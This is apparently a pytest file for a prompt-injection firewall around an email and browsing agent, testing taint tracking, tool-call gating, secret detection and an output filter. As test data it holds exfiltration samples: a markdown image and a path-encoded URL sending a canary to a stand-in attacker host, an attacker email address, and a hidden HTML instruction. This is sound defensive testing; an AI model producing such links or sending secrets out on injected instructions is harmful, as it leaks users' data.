"""Taint tracking, the tool-call policy, and the output filter."""

from __future__ import annotations

import pytest
import yaml

from src.firewall.gating import Decision, ToolGate, find_secrets
from src.firewall.output_filter import filter_output
from src.utils import PROJECT_ROOT

SECRETS = {"sk-live-FAKE-7f3a9c2e1b4d8a60": "api key", "CNRY-abcd1234abcd1234": "session canary"}


@pytest.fixture
def policy() -> dict:
    return yaml.safe_load((PROJECT_ROOT / "configs" / "policy.yaml").read_text(encoding="utf-8"))


@pytest.fixture
def gate(policy) -> ToolGate:
    return ToolGate(policy, secrets=SECRETS)


# -- taint tracking ---------------------------------------------------------- #
def test_session_starts_clean(gate):
    assert not gate.taint.tainted


def test_untrusted_tool_result_marks_taint(gate):
    gate.note_tool_result("read_inbox", untrusted=True)
    assert gate.taint.tainted and "read_inbox" in gate.taint.sources


def test_taint_is_sticky(gate):
    gate.note_tool_result("browse_url", untrusted=True)
    gate.taint.clear()  # sticky policy => clear() is a no-op
    assert gate.taint.tainted


def test_trusted_result_does_not_taint(gate):
    gate.note_tool_result("send_email", untrusted=False)
    assert not gate.taint.tainted


# -- send_email gating ------------------------------------------------------- #
def test_send_email_allowed_when_clean_to_allowlisted(gate):
    r = gate.check("send_email", {"to": "maria@acme-corp.example", "subject": "s", "body": "hi"})
    assert r.decision is Decision.ALLOW


def test_send_email_requires_confirmation_when_tainted(gate):
    gate.note_tool_result("read_inbox", untrusted=True)
    r = gate.check("send_email", {"to": "maria@acme-corp.example", "subject": "s", "body": "hi"})
    assert r.decision is Decision.CONFIRM
    assert any("tainted" in reason for reason in r.reasons)


def test_send_email_allowed_to_allowlisted_recipient_when_user_confirms(gate):
    gate.note_tool_result("read_inbox", untrusted=True)
    r = gate.check("send_email", {"to": "maria@acme-corp.example", "subject": "s", "body": "hi"},
                   user_confirmed=True)
    assert r.decision is Decision.ALLOW
    assert any("confirmed" in reason for reason in r.reasons)


def test_send_email_to_attacker_blocked_when_tainted(gate):
    gate.note_tool_result("read_inbox", untrusted=True)
    r = gate.check("send_email", {"to": "audit-team@secure-verify.test", "subject": "s", "body": "hi"})
    assert r.decision is Decision.BLOCK


def test_user_confirmation_cannot_override_a_block(gate):
    gate.note_tool_result("read_inbox", untrusted=True)
    r = gate.check("send_email", {"to": "audit-team@secure-verify.test", "subject": "s", "body": "x"},
                   user_confirmed=True)
    assert r.decision is Decision.BLOCK


def test_send_email_with_secret_in_body_is_blocked_even_when_clean(gate):
    r = gate.check("send_email", {"to": "maria@acme-corp.example", "subject": "s",
                                  "body": "key: sk-live-FAKE-7f3a9c2e1b4d8a60"})
    assert r.decision is Decision.BLOCK
    assert any("api key" in reason for reason in r.reasons)


def test_send_email_with_canary_in_body_is_blocked(gate):
    r = gate.check("send_email", {"to": "maria@acme-corp.example", "subject": "s",
                                  "body": "session CNRY-abcd1234abcd1234"})
    assert r.decision is Decision.BLOCK


# -- browse_url gating ------------------------------------------------------- #
def test_tainted_session_cannot_fetch_arbitrary_url(gate):
    gate.note_tool_result("read_inbox", untrusted=True)
    r = gate.check("browse_url", {"url": "https://log.secure-verify.test/collect?d=abc"})
    assert r.decision is Decision.BLOCK


def test_clean_session_may_fetch_any_url(gate):
    r = gate.check("browse_url", {"url": "https://anything.example/page"})
    assert r.decision is Decision.ALLOW


def test_unknown_tool_is_blocked(gate):
    assert gate.check("rm_rf", {}).decision is Decision.BLOCK


# -- secret detection -------------------------------------------------------- #
def test_find_secrets_patterns_and_literals():
    assert "api key" in find_secrets("token sk-live-FAKE-7f3a9c2e1b4d8a60")
    assert "session canary" in find_secrets("CNRY-00112233aabbccdd")
    assert find_secrets("nothing sensitive") == []
    assert "private note" in find_secrets("Northwind deal", {"Northwind": "private note"})


# -- output filter ----------------------------------------------------------- #
def test_output_filter_strips_exfil_markdown_image(policy):
    text = "Summary. ![status](https://log.secure-verify.test/collect?d=CNRY-abcd1234abcd1234)"
    r = filter_output(text, policy, SECRETS, canary="CNRY-abcd1234abcd1234")
    # No fetchable URL and no secret survive. The domain name is kept in the placeholder
    # on purpose: it is inert text and it tells the user/analyst what was removed.
    assert "https://log.secure-verify.test" not in r.text
    assert "CNRY-abcd1234abcd1234" not in r.text and "?d=" not in r.text
    assert r.modified and r.removed_urls


def test_output_filter_keeps_allowlisted_image(policy):
    text = "![logo](https://news.example/logo.png)"
    r = filter_output(text, policy, SECRETS)
    assert r.text == text and not r.modified


def test_output_filter_neutralizes_external_link(policy):
    r = filter_output("See [details](https://evil.test/x).", policy, SECRETS)
    assert "evil.test/x" not in r.text and "details" in r.text


def test_output_filter_redacts_secret_and_canary(policy):
    text = "key sk-live-FAKE-7f3a9c2e1b4d8a60 and id CNRY-abcd1234abcd1234"
    r = filter_output(text, policy, SECRETS, canary="CNRY-abcd1234abcd1234")
    assert "sk-live-FAKE" not in r.text and "CNRY-abcd1234abcd1234" not in r.text
    assert any("canary" in reason for reason in r.reasons)


def test_output_filter_removes_html_comment_and_flags_html(policy):
    r = filter_output('<!-- hidden instruction --><div style="display:none">x</div>Summary',
                      policy, SECRETS)
    assert "hidden instruction" not in r.text
    assert any("HTML" in reason for reason in r.reasons)


def test_output_filter_strips_query_from_bare_url(policy):
    r = filter_output("see https://log.secure-verify.test/c?d=secret now", policy, SECRETS)
    assert "d=secret" not in r.text


def test_output_filter_is_noop_on_clean_text(policy):
    text = "You have 3 emails needing attention today."
    r = filter_output(text, policy, SECRETS)
    assert r.text == text and not r.modified


# -- path-based exfil (improvement made after the adaptive-attack round) ------ #
def test_output_filter_strips_data_bearing_path(policy):
    """adapt_path_exfil put the secret in the URL PATH to dodge the strip-query rule."""
    r = filter_output("See https://log.secure-verify.test/ref/CNRY-abcd1234abcd1234 for details.",
                      policy, SECRETS)
    assert "CNRY-abcd1234abcd1234" not in r.text
    assert r.modified


def test_output_filter_keeps_ordinary_readable_paths(policy):
    """The new rule must not fire on normal article URLs (false-positive guard)."""
    for url in ("https://blog.other.example/how-to-cook-pasta",
                "https://docs.other.example/guide/getting-started",
                "https://news.other.example/2026/01/01/headline"):
        r = filter_output(f"Read {url} today.", policy, SECRETS)
        assert url in r.text, f"false positive on {url}: {r.reasons}"
